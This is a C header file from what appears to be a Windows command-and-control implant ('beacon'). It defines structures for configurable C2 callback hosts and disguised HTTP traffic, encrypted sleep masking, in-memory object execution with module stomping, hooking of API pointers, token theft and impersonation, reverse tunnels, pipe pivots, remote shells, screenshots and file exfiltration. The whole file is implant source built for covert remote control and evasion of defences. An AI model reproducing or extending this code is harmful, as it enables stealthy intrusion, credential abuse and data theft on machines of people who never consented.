/* beacon/include/Instance.h
 * NAX_INSTANCE - heap-allocated beacon state.
 * NAX_CONFIG holds all runtime-configurable fields (sleep, jitter, key, C2).
 * Recovered anywhere via G_INSTANCE (reads TEB->NtTib.ArbitraryUserPointer).
 *
 * Each DLL bundle struct holds only function pointers from that DLL. */

#pragma once
#include "Macros.h"
#include "Defs.h"
#include "Wire.h"

/* ntdll.h brings all NT types, NtCurrentProcess/Thread, and full NTAPI declarations
 * (NtAllocateVirtualMemory, NtProtectVirtualMemory, etc.) so we never redefine them. */
#define _WINTERNL_
#include "ntdll.h"
#include <winsock2.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <iphlpapi.h>
#include <aclapi.h>
#include "WinApis.h"

/* ========= [ output configuration ] ========= */

#define BOF_STOMP_ASYNC_MAX 4

#define NAX_FMT_RAW       0u
#define NAX_FMT_BASE64    1u
#define NAX_FMT_BASE64URL 2u
#define NAX_FMT_HEX       3u

#define NAX_PLACE_BODY      0u
#define NAX_PLACE_HEADER    1u
#define NAX_PLACE_COOKIE    2u
#define NAX_PLACE_PARAMETER 3u

typedef struct _NAX_OUTPUT_CFG {
    BYTE   Format;            /* NAX_FMT_* */
    BYTE   Mask;              /* 0 or 1 - XOR with 4-byte random key */
    BYTE   Placement;         /* NAX_PLACE_* */
    CHAR   Name[ 128 ];       /* header/cookie/param name */
    CHAR   Prepend[ 512 ];
    UINT16 PrependLen;
    CHAR   Append[ 512 ];
    UINT16 AppendLen;
    CHAR   EmptyResp[ 512 ];
    UINT16 EmptyRespLen;
} NAX_OUTPUT_CFG;

/* ========= [ runtime configuration ] ========= */

typedef struct {
    UINT32 SleepMs;
    BYTE   JitterPct;
    BYTE   AesKey[ 16 ];
    UINT32 ListenerWm;
    CHAR   C2Url[ 128 ];

    BYTE   ProfileLoaded;
    BYTE   ProfileVersion;     /* 1=legacy, 2=v2 */
    BYTE   Rotation;           /* 0=sequential, 1=random */
    CHAR   BeaconIdHdr[ 128 ]; /* header name for beacon ID (default X-Beacon-Id) */

    /* callback hosts */
    BYTE   HostCount;
    CHAR   Hosts[ 4 ][ 128 ];
    CHAR   UserAgent[ 256 ];

    /* GET transaction */
    BYTE           GetUriCount;
    BYTE           GetUriIdx;
    CHAR           GetUris[ 8 ][ 128 ];
    NAX_OUTPUT_CFG GetClientMeta;
    BYTE           GetClientHdrCount;
    CHAR           GetClientHdrs[ 8 ][ 256 ];
    BYTE           GetClientParamCount;
    CHAR           GetClientParams[ 8 ][ 128 ];
    NAX_OUTPUT_CFG GetServerOutput;

    /* POST transaction */
    BYTE           PostUriCount;
    BYTE           PostUriIdx;
    CHAR           PostUris[ 8 ][ 128 ];
    NAX_OUTPUT_CFG PostClientMeta;
    NAX_OUTPUT_CFG PostClientOutput;
    BYTE           PostClientHdrCount;
    CHAR           PostClientHdrs[ 8 ][ 256 ];
    NAX_OUTPUT_CFG PostServerOutput;

    /* chunked download */
    UINT32 DlChunkSize;

    /* BOF module stomping */
    BYTE   BofStomp;
    WCHAR  BofSyncDll[ 64 ];
    BYTE   BofAsyncCount;
    WCHAR  BofAsyncDlls[ BOF_STOMP_ASYNC_MAX ][ 64 ];
    WCHAR  SmStompDll[ 64 ];
} NAX_CONFIG;

/* ========= [ ntdll.dll ] ========= */

typedef struct {
    HMODULE Handle;
    D_API( RtlAllocateHeap );
    D_API( RtlFreeHeap );
    D_API( RtlExitUserThread );
    D_API( NtAllocateVirtualMemory );
    D_API( NtProtectVirtualMemory );
    D_API( NtFreeVirtualMemory );
    D_API( RtlAddFunctionTable );
    D_API( RtlDeleteFunctionTable );
    D_API( NtOpenProcessToken );
    D_API( NtQueryInformationToken );
    D_API( NtQueryInformationProcess );
    D_API( NtClose );
    D_API( NtQuerySystemInformation );
    D_API( NtOpenProcess );
    D_API( NtTerminateProcess );
    D_API( TpAllocWork );
    D_API( TpPostWork );
    D_API( TpReleaseWork );
    D_API( RtlInitializeCriticalSection );
    D_API( RtlEnterCriticalSection );
    D_API( RtlLeaveCriticalSection );
    D_API( RtlTryEnterCriticalSection );
    D_API( RtlDeleteCriticalSection );
    D_API( LdrRegisterDllNotification );
    D_API( LdrUnregisterDllNotification );
    D_API( _vsnprintf );
    D_API( DbgPrint );
    D_API( NtQueryVirtualMemory );
    D_API( NtSetInformationProcess );
} NAX_NTDLL;

/* ========= [ msvcrt.dll ] ========= */

typedef struct {
    D_API( printf );
} NAX_MSVCRT;

/* ========= [ kernel32.dll ] ========= */

typedef struct {
    HMODULE Handle;
    D_API( ExitProcess );
    D_API( Sleep );
    D_API( LoadLibraryW );
    D_API( HeapCreate );
    D_API( HeapDestroy );
    D_API( GetComputerNameExW );
    D_API( WideCharToMultiByte );
    D_API( MultiByteToWideChar );
    D_API( GlobalFree );
    D_API( CreateDirectoryA );
    D_API( SetCurrentDirectoryA );
    D_API( GetCurrentDirectoryA );
    D_API( CreateFileA );
    D_API( ReadFile );
    D_API( WriteFile );
    D_API( DeleteFileA );
    D_API( CloseHandle );
    D_API( RemoveDirectoryA );
    D_API( FindFirstFileA );
    D_API( FindNextFileA );
    D_API( FindClose );
    D_API( GetFileSize );
    D_API( GetLastError );
    D_API( LoadLibraryA );
    D_API( GetProcAddress );
    D_API( GetModuleHandleA );
    D_API( FreeLibrary );
    D_API( LoadLibraryExW );
    D_API( VirtualProtect );
    D_API( CreateProcessA );
    D_API( CreatePipe );
    D_API( WaitForSingleObject );
    D_API( WaitForMultipleObjects );
    D_API( PeekNamedPipe );
    D_API( CreateNamedPipeA );
    D_API( ConnectNamedPipe );
    D_API( DisconnectNamedPipe );
    D_API( SetNamedPipeHandleState );
    D_API( CreateEventA );
    D_API( SetEvent );
    D_API( ResetEvent );
    D_API( GetOverlappedResult );
    D_API( CancelIo );
    D_API( FlushFileBuffers );
    D_API( CreateThread );
    D_API( TerminateThread );
    D_API( GetTickCount64 );
    D_API( GetCurrentThread );
    D_API( DuplicateHandle );
    D_API( GetCurrentProcess );
    D_API( GetACP );
    D_API( GetOEMCP );
    D_API( GetProcessMitigationPolicy );
    D_API( SetFileAttributesA );
} NAX_KERNEL32;

/* ========= [ kernelbase.dll ] ========= */

typedef struct {
    D_API( SetProcessValidCallTargets );
} NAX_KERNELBASE;

/* ========= [ bcrypt.dll ] ========= */

typedef struct {
    D_API( BCryptOpenAlgorithmProvider );
    D_API( BCryptSetProperty );
    D_API( BCryptGenerateSymmetricKey );
    D_API( BCryptEncrypt );
    D_API( BCryptDecrypt );
    D_API( BCryptDestroyKey );
    D_API( BCryptCloseAlgorithmProvider );
    D_API( BCryptGenRandom );
} NAX_BCRYPT;

/* ========= [ winhttp.dll ] ========= */

typedef struct {
    D_API( WinHttpOpen );
    D_API( WinHttpConnect );
    D_API( WinHttpOpenRequest );
    D_API( WinHttpSendRequest );
    D_API( WinHttpReceiveResponse );
    D_API( WinHttpQueryHeaders );
    D_API( WinHttpReadData );
    D_API( WinHttpCloseHandle );
    D_API( WinHttpCrackUrl );
    D_API( WinHttpSetOption );
    D_API( WinHttpQueryOption );
    D_API( WinHttpQueryDataAvailable );
} NAX_WINHTTP;

/* ========= [ advapi32.dll ] ========= */

typedef struct {
    D_API( GetUserNameW );
    D_API( GetTokenInformation );
    D_API( LookupAccountSidA );
    D_API( AllocateAndInitializeSid );
    D_API( InitializeSecurityDescriptor );
    D_API( SetSecurityDescriptorDacl );
    D_API( SetEntriesInAclA );
    D_API( FreeSid );
    D_API( DuplicateTokenEx );
    D_API( ImpersonateLoggedOnUser );
    D_API( RevertToSelf );
    D_API( LogonUserA );
    D_API( AdjustTokenPrivileges );
    D_API( LookupPrivilegeValueA );
    D_API( LookupPrivilegeNameA );
    D_API( OpenThreadToken );
    D_API( RegCreateKeyExW );
    D_API( RegSetValueExW );
    D_API( RegCloseKey );
} NAX_ADVAPI32;

/* ========= [ iphlpapi.dll ] ========= */

typedef struct {
    D_API( GetAdaptersInfo );
} NAX_IPHLPAPI;

/* ========= [ user32.dll ] ========= */

typedef struct {
    D_API( GetSystemMetrics );
    D_API( GetDC );
    D_API( ReleaseDC );
} NAX_USER32;

/* ========= [ gdi32.dll ] ========= */

typedef struct {
    D_API( CreateCompatibleDC );
    D_API( CreateCompatibleBitmap );
    D_API( SelectObject );
    D_API( BitBlt );
    D_API( GetDIBits );
    D_API( DeleteObject );
    D_API( DeleteDC );
} NAX_GDI32;

/* ========= [ ws2_32.dll (lazy-loaded for tunnels) ] ========= */

typedef struct {
    BOOL Loaded;
    D_API( WSAStartup );
    D_API( WSACleanup );
    D_API( WSAGetLastError );
    D_API( socket );
    D_API( closesocket );
    D_API( connect );
    D_API( bind );
    D_API( listen );
    D_API( accept );
    D_API( send );
    D_API( recv );
    D_API( select );
    D_API( ioctlsocket );
    D_API( htons );
    D_API( ntohs );
    D_API( inet_addr );
    D_API( gethostbyname );
    D_API( setsockopt );
    D_API( shutdown );
    D_API( WSACreateEvent );
    D_API( WSACloseEvent );
    D_API( WSAEventSelect );
    D_API( WSAResetEvent );
    D_API( WSAEnumNetworkEvents );
} NAX_WS2;

/* ========= [ tunnel state ] ========= */

#define NAX_TUNNEL_STATE_CLOSE   0
#define NAX_TUNNEL_STATE_READY   1
#define NAX_TUNNEL_STATE_CONNECT 2

#define NAX_TUNNEL_MODE_TCP      0
#define NAX_TUNNEL_MODE_REVERSE  2

#define NAX_TUNNEL_HIGH_WATERMARK  ( 4 * 1024 * 1024 )
#define NAX_TUNNEL_LOW_WATERMARK   ( 1 * 1024 * 1024 )
#define NAX_TUNNEL_HARD_CAP        ( 16 * 1024 * 1024 )

/* ========= [ token state ] ========= */

typedef struct _NAX_TOKEN_NODE {
    HANDLE                   Handle;
    UINT32                   TokenId;
    UINT32                   SourcePid;
    CHAR                     User[ 128 ];
    CHAR                     Domain[ 128 ];
    struct _NAX_TOKEN_NODE*  Next;
} NAX_TOKEN_NODE;

typedef struct _NAX_TUNNEL {
    UINT32  ChannelId;
    UINT32  Type;
    UINT_PTR Sock;
    BYTE    State;
    BYTE    Mode;
    UINT32  WaitTime;
    UINT64  StartTick;
    UINT32  CloseTimer;
    PBYTE   WriteBuf;
    UINT32  WriteBufSize;
    BOOL    Paused;
    BOOL    SrvPaused;
    struct _NAX_TUNNEL* Next;
} NAX_TUNNEL;

/* ========= [ pivot state ] ========= */

typedef struct _NAX_PIVOT_ASYNC {
    OVERLAPPED OvRead;
    HANDLE     hWriteEvent;
    UINT32     RdHeader;
    BOOL       RdPending;
    BOOL       DataSent;
} NAX_PIVOT_ASYNC;

typedef struct _NAX_PIVOT {
    UINT32            Id;
    HANDLE            hPipe;
    NAX_PIVOT_ASYNC*  Async;
    struct _NAX_PIVOT* Next;
} NAX_PIVOT;

/* ========= [ BOF module stomping ] ========= */

typedef struct {
    PVOID             DllBase;
    PVOID             TextBase;
    ULONG             TextCap;
    PIMAGE_NT_HEADERS Nt;
    BYTE              InUse;
    PVOID             TextBackup;
    PVOID             PdataBase;
    ULONG             PdataSize;
    PVOID             PdataBackup;
} BOF_STOMP_SLOT;

typedef struct {
    BOF_STOMP_SLOT SyncSlot;
    BOF_STOMP_SLOT AsyncSlots[ BOF_STOMP_ASYNC_MAX ];
    BOF_STOMP_SLOT SmSlot;
    BYTE           AsyncCount;
    BYTE           Initialized;
    BYTE           SmStompReq;
} BOF_STOMP_POOL;

/* ========= [ BOF execution context ] ========= */

typedef struct _NAX_BOF_MEDIA {
    struct _NAX_BOF_MEDIA* Next;
    PBYTE  Data;         /* complete entry including type tag (0x81/0x82)       */
    UINT32 Len;
} NAX_BOF_MEDIA;

typedef struct {
    PBYTE  Buf;          /* heap-allocated text output accumulator (8 KB)      */
    UINT32 Len;          /* bytes written so far                                */
    UINT32 Cap;          /* buffer capacity                                     */
    NAX_BOF_MEDIA* MediaHead;  /* linked list of screenshot/download entries   */
    BYTE   Stomped;      /* 0x00=private alloc, 0x01=module stomped            */
    BYTE   StompSlot;    /* sync=0xFF, async=0-3                               */
} NAX_BOF_CTX;

/* ========= [ BOF key-value store ] ========= */

typedef struct _NAX_KV_ENTRY {
    UINT32                Hash;
    PVOID                 Ptr;
    struct _NAX_KV_ENTRY* Next;
} NAX_KV_ENTRY;

/* ========= [ chunked download state ] ========= */

typedef struct _NAX_DOWNLOAD {
    UINT32  TaskId;
    UINT32  FileId;
    HANDLE  hFile;
    UINT32  FileSize;
    UINT32  Index;
    UINT32  ChunkSize;
    struct _NAX_DOWNLOAD* Next;
} NAX_DOWNLOAD;

/* ========= [ upload memory accumulator ] ========= */

typedef struct _NAX_MEMSAVE {
    UINT32  MemoryId;
    UINT32  TotalSize;
    UINT32  CurrentSize;
    PBYTE   Buffer;
    struct _NAX_MEMSAVE* Next;
} NAX_MEMSAVE;

/* ========= [ async job tracking ] ========= */

#define NAX_JOB_PENDING   0
#define NAX_JOB_RUNNING   1
#define NAX_JOB_FINISHED  2
#define NAX_JOB_KILLED    3
#define NAX_JOB_ABANDONED 4

typedef struct _NAX_INSTANCE NAX_INSTANCE, *PNAX_INSTANCE;

typedef struct _NAX_JOB {
    PNAX_INSTANCE       Nax;
    UINT32              TaskId;
    UINT32              State;
    BYTE                AllocMode;
    BYTE                Abandoned;
    BYTE                StompSlotIdx;
    DWORD               ThreadId;
    HANDLE              hStopEvent;
    HANDLE              hThread;
    DWORD               TimeoutMs;
    UINT64              StartTick;
    NAX_BOF_CTX         BofCtx;
    RTL_CRITICAL_SECTION Lock;
    PBYTE               CoffCopy;
    UINT32              CoffSize;
    PBYTE               ArgsCopy;
    UINT32              ArgsSize;
    struct _NAX_JOB*    Next;
} NAX_JOB;

/* ========= [ remote shell tracking ] ========= */

typedef struct _NAX_SHELL {
    UINT32              TerminalId;
    HANDLE              hProcess;
    HANDLE              hThread;
    HANDLE              hStdinWrite;
    HANDLE              hStdoutRead;
    BYTE                State;
    BYTE                Started;
    struct _NAX_SHELL*  Next;
} NAX_SHELL;

/* ========= [ sleep obfuscation runtime config ] ========= */

typedef struct _NAX_SM_CONFIG {
    BYTE  SleepObf;       /* 0=disabled, 1=enabled (WFSO PoC) */
    BYTE  _pad;
} NAX_SM_CONFIG, *PNAX_SM_CONFIG;

/* ========= [ sleepmask info - image region for encrypt/decrypt ] ========= */

typedef struct _NAX_SM_INFO {
    PVOID   BeaconBase;
    UINT32  BeaconSize;
    PVOID   SmBase;
    UINT32  SmSize;
    PVOID   CleanTextBuf;
    UINT32  CleanTextSize;
    NAX_SM_CONFIG Config;
    UINT32  ActiveJobCount;
} NAX_SM_INFO, *PNAX_SM_INFO;

/* ========= [ BeaconGate originals + swap table ] ========= */

typedef struct {
    PVOID  Sleep;
    PVOID  WaitForSingleObject;
    PVOID  WaitForMultipleObjects;
    PVOID  VirtualProtect;
} NAX_GATE_ORIGINALS;

#define NAX_GATE_MAX_SWAPS 8

typedef struct {
    PVOID* Slot;
    PVOID  Original;
} NAX_GATE_SWAP;

typedef struct {
    NAX_GATE_SWAP Entries[NAX_GATE_MAX_SWAPS];
    UINT32        Count;
} NAX_GATE_SWAP_TABLE;

/* ========= [ beacon instance ] ========= */

#define NAX_HTTP_STALE_MS  60000u  /* close persistent handles when sleep > this */
#define NAX_INSTANCE_MAGIC 0x4E615843u  /* "NaXC" */

struct _NAX_INSTANCE {
    UINT32       Magic;          /* NAX_INSTANCE_MAGIC — validates TEB pointer */
    CHAR         SessionId[17];  /* 16 hex chars + NUL                    */
    NAX_CONFIG   Config;
    HANDLE       Heap;

    /* persistent WinHTTP handles - reused across heartbeats              */
    HINTERNET    hSession;
    HINTERNET    hConnect;

    /* system info - gathered once at boot, sent in REGISTER */
    BYTE         Elevated;       /* 1 if running elevated / admin          */
    UINT32       OsMajor;        /* Windows major version (PEB+0x118)      */
    UINT32       OsMinor;        /* Windows minor version (PEB+0x11C)      */
    UINT16       OsBuild;        /* Windows build number  (PEB+0x120)      */
    UINT32       ParentPid;
    UINT32       Acp;            /* ANSI code page                         */
    UINT32       OemCp;          /* OEM code page                          */
    CHAR         ImgPath[260];   /* full image path (UTF-8)                */

    NAX_NTDLL      Ntdll;
    NAX_MSVCRT     Msvcrt;
    NAX_KERNEL32   Kernel32;
    NAX_KERNELBASE Kernelbase;
    NAX_BCRYPT     Bcrypt;

    BOOL           CfgEnabled;
    NAX_WINHTTP  Winhttp;
    NAX_ADVAPI32 Advapi32;
    NAX_IPHLPAPI Iphlpapi;
    NAX_USER32   User32;
    NAX_GDI32    Gdi32;
    NAX_BOF_CTX       BofCtx;
    BOF_STOMP_POOL    BofStompPool;
    NAX_PIVOT*        PivotHead;
    NAX_DOWNLOAD*     DownloadHead;
    NAX_MEMSAVE*      MemSaveHead;
    NAX_JOB*     JobHead;
    HANDLE       JobWakeEvent;
    BYTE         WatchdogDisabled;
    HANDLE       ActiveToken;
    HANDLE       OriginalPrimaryToken;
    NAX_TOKEN_NODE* TokenHead;
    NAX_WS2      Ws2;
    NAX_TUNNEL*  TunnelHead;
    HANDLE       TunnelEvent;
    NAX_SHELL*   ShellHead;
    NAX_KV_ENTRY* KvHead;

    PBYTE        DynResp;       /* dynamic heartbeat response (Content-Length > IO_CAP) */
    UINT32       DynRespLen;
    PVOID              Gate;
    NAX_GATE_ORIGINALS GateOriginals;
    NAX_GATE_SWAP_TABLE GateSwaps;
    PBYTE              SmBofCache;
    UINT32             SmBofCacheLen;
    NAX_SM_INFO        SmInfo;

    /* resident BOF state (sleepmask) - kept alive across heartbeats */
    PVOID        ResidentSections[16];
    UINT16       ResidentNumSections;
    PVOID        ResidentMapFunc;
    BOOL         ResidentStomped;
    PRUNTIME_FUNCTION ResidentPdata;
    DWORD        ResidentPdataCount;
    BOOL         ResidentPdataInDll;
};

static inline NAX_JOB* NaxFindCurrentJob( PNAX_INSTANCE Nax ) {
    DWORD tid = (DWORD)(ULONG_PTR)NaxCurrentTeb()->ClientId.UniqueThread;
    NAX_JOB* j = Nax->JobHead;
    while ( j ) {
        if ( ( j->State == NAX_JOB_RUNNING || j->State == NAX_JOB_ABANDONED ) && j->ThreadId == tid )
            return j;
        j = j->Next;
    }
    return NULL;
}
